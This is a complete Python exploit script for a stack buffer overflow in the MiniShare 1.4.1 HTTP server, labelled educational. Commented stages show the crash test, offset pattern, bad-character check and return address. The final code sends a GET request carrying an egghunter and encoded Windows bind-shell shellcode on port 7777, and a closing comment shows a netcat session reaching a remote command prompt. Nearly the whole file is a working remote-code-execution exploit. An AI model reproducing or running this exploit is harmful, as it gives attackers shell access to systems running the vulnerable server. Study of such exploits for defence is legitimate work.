#!/usr/bin/python

import socket, sys, os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 80))

# Title Minishare 1.4.1 bufferoverflow exploit with egghunter. For educational purposes.
# Filename:minishare.py
# Author:  Oleg Boytsev
# License http://creativecommons.org/licenses/by-sa/3.0/
# Legitimate use and research only
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

#INTRO/TESTS:
#buffer ="GET "

#1. Send 2000 #buffer +="A"*2000 and check if app is vulnerable, and it crashes with 414141 in EIP)
#buffer +="A"*2000

#2. Send 2000 length pattern to find EIP and ESP offset (EIP - 1787, ESP - 1791)
#buffer +="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"

#3. Lets recheck EIP and ESP positions
#buffer +="A"*1787 #EIP starts from here
#buffer +="B"*4  #EIP/ret addr will be removed by addr of esp or "jmp esp")
#buffer +="C"*4  #esp points here
#buffer +="Z"*500 #our shellcode here

#4. Almost ready, but let's check for bad characters
#buffer +="A"*1787
#buffer +="\x0a\xaf\xd7\x77"   #Here it is a memory location from user32.dll where JMP ESP is stored
#all possible hex is here
#buffer +="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#5. Sweat final) bad character is \x00, so the final exploit will look like that:
#buffer +="A"*1787
#buffer +="\x0a\xaf\xd7\x77"   #Here it is a memory location from user32.dll where JMP ESP is stored
#or
#buffer +="\x08\x39\x42\x01"    #esp addr

#6. Let's try with egg hunter
Padding = "A"*1787
RA = "\x08\x39\x42\x01"    #esp addr

#shellcode: msfpayload windows/shell_bind_tcp LPORT=7777 R | msfencode -b "\x00" -t c -a x86
Shellcode =("\xbe\xa1\x49\xfb\x94\xda\xc4\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x56\x83\xe8\xfc\x31\x70\x0f\x03\x70\xae\xab\x0e\x68\x58\xa2"
"\xf1\x91\x98\xd5\x78\x74\xa9\xc7\x1f\xfc\x9b\xd7\x54\x50\x17"
"\x93\x39\x41\xac\xd1\x95\x66\x05\x5f\xc0\x49\x96\x51\xcc\x06"
"\x54\xf3\xb0\x54\x88\xd3\x89\x96\xdd\x12\xcd\xcb\x2d\x46\x86"
"\x80\x9f\x77\xa3\xd5\x23\x79\x63\x52\x1b\x01\x06\xa5\xef\xbb"
"\x09\xf6\x5f\xb7\x42\xee\xd4\x9f\x72\x0f\x39\xfc\x4f\x46\x36"
"\x37\x3b\x59\x9e\x09\xc4\x6b\xde\xc6\xfb\x43\xd3\x17\x3b\x63"
"\x0b\x62\x37\x97\xb6\x75\x8c\xe5\x6c\xf3\x11\x4d\xe7\xa3\xf1"
"\x6f\x24\x35\x71\x63\x81\x31\xdd\x60\x14\x95\x55\x9c\x9d\x18"
"\xba\x14\xe5\x3e\x1e\x7c\xbe\x5f\x07\xd8\x11\x5f\x57\x84\xce"
"\xc5\x13\x27\x1b\x7f\x7e\x20\xe8\xb2\x81\xb0\x66\xc4\xf2\x82"
"\x29\x7e\x9d\xae\xa2\x58\x5a\xd0\x99\x1d\xf4\x2f\x21\x5e\xdc"
"\xeb\x75\x0e\x76\xdd\xf5\xc5\x86\xe2\x20\x49\xd7\x4c\x9a\x2a"
"\x87\x2c\x4a\xc3\xcd\xa2\xb5\xf3\xed\x68\xc0\x33\x20\x48\x81"
"\xd3\x41\x6e\x3b\x45\xcf\x88\x29\x95\x99\x03\xc5\x57\xfe\x9b"
"\x72\xa7\xd4\xb7\x2b\x3f\x60\xde\xeb\x40\x71\xf4\x58\xec\xd9"
"\x9f\x2a\xfe\xdd\xbe\x2d\x2b\x76\xc8\x16\xbc\x0c\xa4\xd5\x5c"
"\x10\xed\x8d\xfd\x83\x6a\x4d\x8b\xbf\x24\x1a\xdc\x0e\x3d\xce"
"\xf0\x29\x97\xec\x08\xaf\xd0\xb4\xd6\x0c\xde\x35\x9a\x29\xc4"
"\x25\x62\xb1\x40\x11\x3a\xe4\x1e\xcf\xfc\x5e\xd1\xb9\x56\x0c"
"\xbb\x2d\x2e\x7e\x7c\x2b\x2f\xab\x0a\xd3\x9e\x02\x4b\xec\x2f"
"\xc3\x5b\x95\x4d\x73\xa3\x4c\xd6\x83\xee\xcc\x7f\x0c\xb7\x85"
"\x3d\x51\x48\x70\x01\x6c\xcb\x70\xfa\x8b\xd3\xf1\xff\xd0\x53"
"\xea\x8d\x49\x36\x0c\x21\x69\x13")

Hunter = (
"\xfc\x66\x81\xc2\xff\x0f\x42\x31\xc0\xb0\x02\x52\xcd\x2e\x5a\x2c\x05\x74\xee\xb8"
"\x61\x72\x6d\x37" #arm7arm7 marker
"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
)

marker_Shellcode = "arm7arm7" + Shellcode
Padding2 = "R"*30

buffer =(
"GET " + Padding + RA + Hunter + Padding2 + marker_Shellcode + " HTTP/1.1\r\n\r\n"
)

sock.send(buffer)
sock.close()

#Bingo)!
#nc 192.168.223.128 7777
#Microsoft Windows XP [5.1.2600]
#() , 1985-2001.
#C:\Program Files\MiniShare
